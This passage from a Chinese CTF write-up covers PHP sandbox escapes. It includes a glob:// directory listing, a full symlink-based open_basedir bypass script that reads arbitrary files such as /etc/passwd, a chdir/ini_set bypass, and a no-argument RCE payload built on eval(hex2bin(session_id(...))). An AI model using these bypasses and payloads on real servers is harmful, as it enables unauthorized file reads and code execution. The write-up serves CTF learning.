class=\"prism language-php\">  <span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"glob:///*\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">opendir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">readdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!==</span> <span class=\"token constant boolean\">false</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n      <span class=\"token keyword\">echo</span> <span class=\"token variable\">$file</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token function\">closedir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\b6a452c1c9b44a2f9b294421090b86ee.png\"/></p>\n<h3><a id=\"1p_549\"></a>1.拿p神的脚本镇一下</h3>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">/*\n* by phithon\n* From https://www.leavesongs.com\n* detail: http://cxsecurity.com/issue/WLB-2009110068\n*/</span>\n<span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'content-type: text/plain'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'display_errors'</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">TRUE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"open_basedir: %s\\nphp_version: %s\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">ini_get</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'open_basedir'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">phpversion</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"disable_functions: %s\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">ini_get</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'disable_functions'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\\\\'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">'/etc/passwd'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$relat_file</span> <span class=\"token operator\">=</span> <span class=\"token function\">getRelativePath</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$paths</span> <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">999</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$exp</span> <span class=\"token operator\">=</span> <span class=\"token function\">getRandStr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$paths</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$paths</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$paths</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$paths</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">-=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">--</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span> \n    <span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$paths</span> <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$relat_file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$j</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$paths</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span> \n    <span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$j</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;=</span> <span class=\"token variable\">$j</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span> \n    <span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$tmp</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_fill</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$j</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">symlink</span><span class=\"token punctuation\">(</span><span class=\"token function\">implode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$tmp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'tmplink'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$tmp</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_fill</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$j</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">symlink</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'tmplink/'</span> <span class=\"token operator\">.</span> <span class=\"token function\">implode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$tmp</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$exp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'tmplink'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'tmplink'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">delfile</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$exp</span> <span class=\"token operator\">=</span> <span class=\"token function\">dirname</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SCRIPT_NAME'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"/<span class=\"token interpolation\"><span class=\"token punctuation\">{<!-- --></span><span class=\"token variable\">$exp</span><span class=\"token punctuation\">}</span></span>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$exp</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"http://<span class=\"token interpolation\"><span class=\"token punctuation\">{<!-- --></span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SERVER_NAME'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span></span><span class=\"token interpolation\"><span class=\"token punctuation\">{<!-- --></span><span class=\"token variable\">$exp</span><span class=\"token punctuation\">}</span></span>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\\n-----------------content---------------\\n\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$exp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">delfile</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'tmplink'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getRelativePath</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$from</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$to</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n  <span class=\"token comment\">// some compatibility fixes for Windows paths</span>\n  <span class=\"token variable\">$from</span> <span class=\"token operator\">=</span> <span class=\"token function\">rtrim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$from</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'\\/'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$from</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\\\\'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$from</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$to</span>   <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\\\\'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$to</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token variable\">$from</span>   <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$from</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$to</span>     <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$to</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$relPath</span>  <span class=\"token operator\">=</span> <span class=\"token variable\">$to</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$from</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$depth</span> <span class=\"token operator\">=&gt;</span> <span class=\"token variable\">$dir</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token comment\">// find first non-matching dir</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dir</span> <span class=\"token operator\">===</span> <span class=\"token variable\">$to</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$depth</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n      <span class=\"token comment\">// ignore this directory</span>\n      <span class=\"token function\">array_shift</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$relPath</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n      <span class=\"token comment\">// get number of remaining dirs to $from</span>\n      <span class=\"token variable\">$remaining</span> <span class=\"token operator\">=</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$from</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$depth</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$remaining</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token comment\">// add traversals up to first matching dir</span>\n        <span class=\"token variable\">$padLength</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$relPath</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$remaining</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$relPath</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_pad</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$relPath</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$padLength</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$relPath</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'./'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$relPath</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token keyword\">return</span> <span class=\"token function\">implode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$relPath</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">delfile</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$deldir</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>@<span class=\"token function\">is_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$deldir</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        @<span class=\"token function\">chmod</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$deldir</span><span class=\"token punctuation\">,</span><span class=\"token number\">0777</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> @<span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$deldir</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>@<span class=\"token function\">is_dir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$deldir</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$mydir</span> <span class=\"token operator\">=</span> @<span class=\"token function\">opendir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$deldir</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token constant boolean\">false</span> <span class=\"token operator\">!==</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> @<span class=\"token function\">readdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$mydir</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token function\">File_Str</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$deldir</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token operator\">!=</span><span class=\"token string single-quoted-string\">'.'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token operator\">!=</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token function\">delfile</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span> \n        @<span class=\"token function\">closedir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$mydir</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        @<span class=\"token function\">chmod</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$deldir</span><span class=\"token punctuation\">,</span><span class=\"token number\">0777</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> @<span class=\"token function\">rmdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$deldir</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token constant boolean\">true</span> <span class=\"token punctuation\">:</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">File_Str</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$string</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">return</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'//'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">,</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\\\\'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$string</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getRandStr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$length</span> <span class=\"token operator\">=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$chars</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$randStr</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$length</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$randStr</span> <span class=\"token operator\">.=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$chars</span><span class=\"token punctuation\">,</span> <span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$chars</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">return</span> <span class=\"token variable\">$randStr</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>p神 永远滴神<br/> <img alt=\"在这里插入图片描述\" src=\"image\\24339c2d4cd243be8a39d6bf5a2e1cf6.png\"/></p>\n<h3><a id=\"2_chdir_664\"></a>2. chdir过</h3>\n<p>不赘述</p>\n<pre><code class=\"prism language-php\"><span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"s\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'s'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'open_basedir'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'open_basedir'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/ctfshowflag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<h1><a id=\"806_rce_678\"></a>806 无参数rce</h1>\n<p>参考</p>\n<blockquote>\n<p>https://www.cnblogs.com/sylover/p/11863778.html</p>\n</blockquote>\n<h3><a id=\"1_session_id_683\"></a>1. session_id执行</h3>\n<p>仅限php7版本以下使用<br/> http-header传参</p>\n<p>在session_id中设置我们想要输入的RCE，达到传参的目的，但是第一点需要session_start()开启session会话。</p>\n<p>payload：code=eval(hex2bin(session_id(session_start())));</p>\n<p>hex(“phpinfo();”)=706870696e666f28293b<br/> <img alt=\"在这里插入图片描述\" src=\"image\\f53ff951caf54dadb5d4a261d098123f.png\"/><br/> 此处第一种方法不可行(maybe我太菜了没理解)<br/> 会话已存活 无法改变session_id<br/> <img alt=\"在这里插入图片描述\" src=\"image\\f0544664478c40f38d1ad871ac0504bd.png\"/></p>\n<h3><a id=\"2getallheaders_696\"></a>2.getallheaders()</h3>\n<p>获取请求头信息</p>\n<h5><a id=\"getallheaders_698\"></a>getallheaders</h5>\n<p>(PHP 4, PHP 5, PHP 7, PHP 8)</p>\n<p>getallheaders — 获取全部 